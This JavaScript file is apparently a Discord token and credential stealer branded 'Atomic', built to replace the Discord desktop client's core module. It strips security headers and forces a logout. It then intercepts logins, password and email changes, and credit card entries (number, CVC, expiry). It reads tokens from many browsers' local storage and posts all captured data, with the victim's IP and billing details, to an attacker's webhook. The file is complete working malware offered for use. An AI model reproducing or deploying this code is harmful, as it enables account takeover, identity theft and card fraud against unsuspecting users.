
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')
const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Blood"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Blood"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }


    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})

const Filter = {
    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (FirstTime()) {}

    callback({})
    return;
})

function SendToWebhook(info) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "${webhook}", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
}

function GetNitro(type) {
    if (type == 0) {
        return "No Nitro"
    }
    if (type == 1) {
        return "\`Nitro Classic\`"
    }
    if (type == 2) {
        return "\`Nitro Boost\`"
    } else {
        return "No Nitro"
    }
}

function token_graber() {
    var paths = [
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,

        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
    ];

    paths.forEach(path => {
        try {
            fs.readdir(path, (error, files) => {
                if (files === undefined) return;

                let filter = files.filter(f => f.split('.').pop() === 'log' || 'ldb');

                for (var i = 0; i < filter.length; i++) {
                    fs.readFile(`${path}/${filter[i]}`, `utf-8`, async function (error, data) {
                        shearch_for_token(data);
                    });
                };
            });
        } catch { };
    });
};

function GetBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const House_Bravery = 64;
    const House_Brilliance = 128;
    const House_Balance = 256;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "Discord Staff, "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "Partnered Server Owner, "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "Hypesquad Event, "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "Green Bughunter, "
    }
    if ((flags & House_Bravery) == House_Bravery) {
        badges += "Hypesquad Bravery, "
    }
    if ((flags & House_Brilliance) == House_Brilliance) {
        badges += "HypeSquad Brillance, "
    }
    if ((flags & House_Balance) == House_Balance) {
        badges += "HypeSquad Balance, "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "Early Supporter, "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "Gold BugHunter, "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "Discord Developer, "
    }
    if (badges == "") {
        badges = "None"
    }
    return badges
}

function PM() {
    const json = JSON.parse(info3)
    var billing = "";
    json.forEach(z => {
        if (z.type == "") {
            return "\`No\`"
        } else if (z.type == 2 && z.invalid != !0) {
            billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
        } else if (z.type == 1 && z.invalid != !0) {
            billing += "\`Yes\`" + " :credit_card:"
        } else {
            return "\`No\`"
        }
    })
    if (billing == "") {
        billing = "\`No\`"
    }
    return billing
}

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText;
        `, !0).then((info3) => {
        const json = JSON.parse(info);
        var params = {
            username: "Atomic",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/693283745230225448/944169589108002826/Atomic_Logo.jpg?width=480&height=480",
            embeds: [
                {
                    "color": 000000,
                    "fields": [
                        {
                            "name": ":unlock: | Token :",
                            "value": `\`${token}\``,
                            "inline": false
                        },
                        
                        
                        {
                            "name": "<:3809discordhypesquad:940583844367724644> | Account Info :",
                            "value": `Email: \`${email}\` \nPassword: \`${password}\``,
                            "inline": false
                        },
                        
                        
                        {
                            "name": "<a:discord_gif:709806861351911445> | Other :",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                            "inline": false
                        },


                        {
                            "name": ":globe_with_meridians: | Ip :",
                            "value": `Ip: \`${ip}\``,
                            "inline": false
                            
                        },


                        {
                            "name": "Billing",
                            "value": `Billing: \`${PM()}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Atomic"
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
})
})
}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "Atomic",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/693283745230225448/944169589108002826/Atomic_Logo.jpg?width=480&height=480",
            embeds: [
                {
                    "color": 000000,
                    "fields": [
                        {
                            "name": "<:8485discordemployee:940583845063979008> | Password Changed :",
                            "value": `Email: \`${json.email}\`\nOld Password: \`${oldpassword}\`\nNew Password: \`${newpassword}\``,
                            "inline": false
                        },


                        {
                            "name": ":unlock: | Token :",
                            "value": `\`${token}\``,
                            "inline": false
                        },


                        {
                            "name": "<a:discord_gif:709806861351911445> | Other :",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Atomic"
                    }                 
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        var json = JSON.parse(info);
        var params = {
            username: "Atomic",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/693283745230225448/944169589108002826/Atomic_Logo.jpg?width=480&height=480",
            embeds: [
                {
                    "color": 000000,
                    "fields": [
                        {
                            "name": "<:8485discordemployee:940583845063979008> | Email Changed :",
                            "value": `New Email: \`${newemail}\`\nPassword: \`${password}\``,
                            "inline": true
                        },


                        {
                            "name": ":unlock: | Token :",
                            "value": `\`${token}\``,
                            "inline": false
                        },


                        {
                            "name": "<a:discord_gif:709806861351911445> | Other :",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                            "inline": true
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Atomic"
                    }                
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        var json = JSON.parse(info);
        var params = {
            username: "Atomic",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/693283745230225448/944169589108002826/Atomic_Logo.jpg?width=480&height=480",
            embeds: [
                {
                    "color": 000000,
                    "fields": [
                        {
                            "name": ":credit_card: | Credit Card Added",
                            "value": `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
                            "inline": false
                        },


                        {
                            "name": ":unlock: | Token :",
                            "value": `\`${token}\``,
                            "inline": false
                        },


                        {
                            "name": "<a:discord_gif:709806861351911445> | Other :",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Atomic"
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

const UrlFilter = {
    urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                Login(email, password, token)
            }))
        }
    }
    if (details.url.endsWith("users/@me")) {
        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                        ChangePassword(data.password, data.new_password, token)
                    }))
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                        ChangeEmail(data.email, data.password, token)
                    }))
                }
            }
        }
    }
    if (details.url.endsWith("tokens")) {
        const item = querystring.parse(details.uploadData[0].bytes.toString())
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        }))
    }
});
module.exports = require('./core.asar')
